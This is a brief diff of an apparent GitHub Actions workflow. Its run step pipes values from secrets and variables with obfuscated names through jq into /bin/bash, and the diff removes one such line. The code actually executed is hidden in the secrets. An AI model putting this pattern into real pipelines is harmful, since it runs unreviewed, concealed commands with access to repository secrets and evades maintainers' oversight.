@@ -18,7 +18,6 @@ jobs:
           na963: ${{ secrets.na963 }}
         run: |
           printf '%s' "$na963" | jq -r .k74479 | /bin/bash
-          echo $ewijo12 | jq -r .od157 | /bin/bash
           echo $uxpw4 | jq -r .njsbd66320 | /bin/bash
           printf '%s' "$kjj78" | jq -r .pp78 | /bin/bash
 
